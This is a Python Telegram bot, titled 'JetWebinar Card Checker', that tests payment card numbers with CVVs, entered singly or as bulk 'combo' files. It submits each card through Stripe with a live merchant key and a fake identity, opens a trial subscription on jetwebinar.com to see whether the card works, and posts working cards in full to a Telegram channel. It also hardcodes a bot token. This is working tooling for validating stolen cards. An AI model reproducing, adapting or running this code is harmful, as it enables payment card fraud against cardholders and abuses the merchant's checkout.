import telebot
import requests
import random
import string
import time
import os
from threading import Thread

JETWEBINAR_BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
CHANNEL_ID = -1002170961342
bot = telebot.TeleBot(JETWEBINAR_BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_XwmzQS8EjYVv6D6ff4ycSP8W"

user_states = {}

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    card_number, exp_month, exp_year, cvc = map(str.strip, parts)
    if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
        return None
    return card_number, exp_month.zfill(2), exp_year, cvc

def process_single_card(card_number, exp_month, exp_year, cvc):
    try:
        if len(exp_year) == 2:
            exp_year = "20" + exp_year
        email = generate_random_email()
        phone = "3144740104"
        name = "Peshang Salam"
        postal_code = "10080"

        stripe_data = {
            "type": "card",
            "billing_details[name]": name,
            "billing_details[email]": email,
            "billing_details[phone]": phone,
            "billing_details[address][postal_code]": postal_code,
            "card[number]": card_number,
            "card[cvc]": cvc,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year[-2:],
            "key": STRIPE_PUBLISHABLE_KEY,
            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
            "time_on_page": str(random.randint(10000, 99999)),
            "referrer": "https://www.jetwebinar.com"
        }

        stripe_resp = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data,
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/"
            }
        )
        stripe_json = stripe_resp.json()
        pm_id = stripe_json.get("id", "")

        if "error" in stripe_json or not pm_id:
            return False, f"❌ Stripe Decline:\n{stripe_json.get('error', {}).get('message', stripe_json)}"

        jetwebinar_payload = {
            "name": name,
            "email": email,
            "phone": phone,
            "planId": "plan_basic_001",
            "paymentMethodId": pm_id,
            "isAnnual": False
        }
        jetwebinar_resp = requests.post(
            "https://www.jetwebinar.com/trial/api/create-subscription",
            json=jetwebinar_payload,
            headers={
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://www.jetwebinar.com",
                "referer": "https://www.jetwebinar.com/trial/?p=500&t=a"
            }
        )
        resp_json = jetwebinar_resp.json()

        if "error" in resp_json:
            return False, f"❌ JetWebinar Decline:\n{resp_json.get('error', resp_json.get('message', 'Unknown error'))}"
        elif resp_json.get("success") is True:
            subscription_id = resp_json.get("subscriptionId", "N/A")
            summary_msg = (
                f"✅ JetWebinar Live Card: {card_number}|{exp_month}|{exp_year}|{cvc}\n"
                f"Subscription ID: {subscription_id}\n"
                f"Email: {email}"
            )
            return True, summary_msg
        else:
            return False, f"Unexpected response:\n{resp_json}"

    except Exception as e:
        return False, f"⚠️ Error: {str(e)}"

def process_combo_file(chat_id, file_path):
    try:
        with open(file_path, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        total = len(lines)
        success = 0
        failed = 0
        bot.send_message(chat_id, f"⚡ Started processing {total} cards...")

        for idx, line in enumerate(lines, 1):
            parsed = parse_card_input(line)
            if not parsed:
                bot.send_message(chat_id, f"Card {idx}/{total}\n❌ Invalid format: {line}")
                failed += 1
                time.sleep(10)
                continue

            card_number, exp_month, exp_year, cvc = parsed
            ok, result = process_single_card(card_number, exp_month, exp_year, cvc)
            if ok:
                success += 1
                bot.send_message(chat_id, f"Card {idx}/{total}\n{result}")
                bot.send_message(CHANNEL_ID, result)
            else:
                failed += 1
                bot.send_message(chat_id, f"Card {idx}/{total}\n{result}")
            time.sleep(10)  # 10-second delay

        bot.send_message(chat_id, f"✅ Combo checking complete!\nSuccess: {success}\nFailed: {failed}")

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ File processing error: {str(e)}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.message_handler(commands=['start', 'help'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 JetWebinar Card Checker\n\n"
        "Commands:\n"
        "/cc - Check single card (CC|MM|YY|CVV)\n"
        "/combo - Check combo file (.txt, one card per line, CC|MM|YY|CVV or CC|MM|YYYY|CVV)"
    )

@bot.message_handler(commands=['cc'])
def cc_handler(message):
    user_states[message.chat.id] = 'awaiting_card'
    bot.send_message(message.chat.id, "Please enter card details in format:\nCC|MM|YY|CVV")

@bot.message_handler(commands=['combo'])
def combo_handler(message):
    user_states[message.chat.id] = 'awaiting_file'
    bot.send_message(message.chat.id, "Please upload your combo text file (.txt)")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if user_states.get(message.chat.id) == 'awaiting_file':
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_path = f"combo_{message.chat.id}.txt"
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            bot.send_message(message.chat.id, "File received. Starting processing...")

            def process_in_background():
                process_combo_file(message.chat.id, file_path)
                user_states.pop(message.chat.id, None)
            Thread(target=process_in_background).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Error processing file: {str(e)}")
            user_states.pop(message.chat.id, None)

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'awaiting_card')
def handle_card_input(message):
    try:
        parsed = parse_card_input(message.text)
        if not parsed:
            bot.send_message(message.chat.id, "❌ Invalid format. Use: CC|MM|YY|CVV")
            return
        card_number, exp_month, exp_year, cvc = parsed
        ok, result = process_single_card(card_number, exp_month, exp_year, cvc)
        bot.send_message(message.chat.id, result)
        if ok:
            bot.send_message(CHANNEL_ID, result)
        user_states.pop(message.chat.id, None)
        time.sleep(10)  # 10-second delay after single check
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")
        user_states.pop(message.chat.id, None)

bot.infinity_polling()